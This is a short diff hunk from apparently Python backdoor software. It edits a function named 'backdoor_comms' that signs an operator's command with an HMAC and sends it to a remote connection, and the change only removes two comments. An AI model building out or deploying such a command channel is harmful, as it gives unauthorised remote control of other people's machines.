@@ -35,10 +35,7 @@ def backdoor_comms(conn):
                 print("[*] Closing connection...")
                 break
             
-            # Generate HMAC for the command
             command_hmac = generate_hmac(command)
-            
-            # Send command and HMAC together
             message = command + SEP + command_hmac
             conn.send(message.encode())
             
